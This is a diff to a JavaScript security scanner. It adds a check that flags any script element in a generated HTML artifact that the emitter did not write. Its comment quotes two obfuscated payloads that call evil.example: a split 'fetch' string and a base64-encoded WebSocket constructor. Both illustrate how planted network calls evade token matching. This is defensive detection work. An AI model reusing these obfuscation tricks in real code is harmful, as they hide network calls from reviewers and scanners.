@@ -245,6 +245,96 @@ export function scanForNetworkReferences(html, options = {}) {
 }
 
 /**
+ * The script elements `emit/document.js` writes, and the `type` each one
+ * carries. Nothing else belongs in an artifact.
+ */
+export const EMITTED_SCRIPTS = Object.freeze({
+  'pp-model': 'application/octet-stream',
+  'pp-media': 'application/octet-stream',
+  'pp-manifest': 'application/json',
+  'pp-runtime': '',
+  'pp-boot': '',
+});
+
+/**
+ * Every script element in the document that the emitter did not write (C16).
+ *
+ * The scanner reads inline script as code and catches the network APIs by name,
+ * with comments and string literals masked so a token has to be in code
+ * position. It caught twenty-six of the §20 critic's twenty-seven planted
+ * references, `window["fe"+"tch"]("htt"+"ps://evil.example/x")` included. The
+ * twenty-seventh was this:
+ *
+ * ```js
+ * new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))
+ * ```
+ *
+ * No token, no URL, nothing to match. The obvious answer — decode base64
+ * literals and rescan — is recorded and rejected in `docs/decisions/L10-emit.md`
+ * (E33): it buys one encoding out of an unbounded set, and `atob` is a thing
+ * the artifact's own decoder calls, so the rule that would catch this pattern
+ * is a rule that fires on the artifact.
+ *
+ * This is the answer that does not depend on how the payload is spelled. An
+ * artifact's executable code is the runtime bundle and its boot script, both
+ * written by the emitter from strings the emitter was given. Any other script
+ * element is prospect content that has become code, and code the emitter did not
+ * write is code it cannot show makes no network call — which is the whole of
+ * what §18.4 says it must show. So it is reported, at severity 1, and the
+ * question of what the code is obfuscating never has to be asked.
+ *
+ * Reported as `NETWORK_REFERENCE` because that is §18.4's code and this is
+ * §18.4's law; §4 fixes the set of codes and inventing a fourteenth to describe
+ * one route to the same failure would not help anyone reading the report.
+ *
+ * @param {string} html
+ * @param {object} [options]
+ * @param {Record<string, string>} [options.allowed]  id → expected `type`; default none
+ * @param {string} [options.where]
+ * @param {Record<string, unknown>} [options.locus]
+ * @returns {import('../core/contracts.d.ts').Finding[]}
+ */
+export function scanForeignScripts(html, options = {}) {
+  const src = String(html == null ? '' : html);
+  const allowed = options.allowed || {};
+  const baseLocus = options.locus || {};
+  const where = options.where || 'document';
+  /** @type {import('../core/contracts.d.ts').Finding[]} */
+  const findings = [];
+  /** @type {Set<string>} */
+  const seen = new Set();
+
+  for (const token of tokenizeHtml(src)) {
+    if (token.kind !== 'tag' || token.name !== 'script') continue;
+    const id = (attrValue(token, 'id') || '').trim();
+    const type = (attrValue(token, 'type') || '').trim().toLowerCase().split(';')[0];
+    const expected = Object.prototype.hasOwnProperty.call(allowed, id) ? allowed[id] : null;
+
+    let problem = null;
+    if (expected === null) {
+      problem = id
+        ? `<script id="${id}"> is not one of the elements the emitter writes`
+        : 'a script element with no id, and the emitter writes none';
+    } else if (type !== expected) {
+      problem = `<script id="${id}"> carries type="${type || ''}" where the emitter writes type="${expected}"`;
+    } else if (seen.has(id)) {
+      problem = `a second <script id="${id}">, and the artifact boots from the first`;
+    }
+    if (expected !== null) seen.add(id);
+    if (!problem) continue;
+
+    const { line, column } = lineColOf(src, token.index);
+    findings.push(networkFinding({
+      message: `${problem}. An artifact's executable code is the runtime bundle and its boot script and nothing else — `
+        + 'script the emitter did not write is script it cannot show makes no network call, however it is spelled (§18.4).',
+      locus: { ...baseLocus, where, line, column, excerpt: excerptAt(src, token.index) },
+    }));
+  }
+
+  return findings;
+}
+
+/**
  * @param {import('./scan-parse.js').HtmlToken[]} tokens
  * @param {import('./scan-parse.js').HtmlToken} rawToken
  * @param {string} name
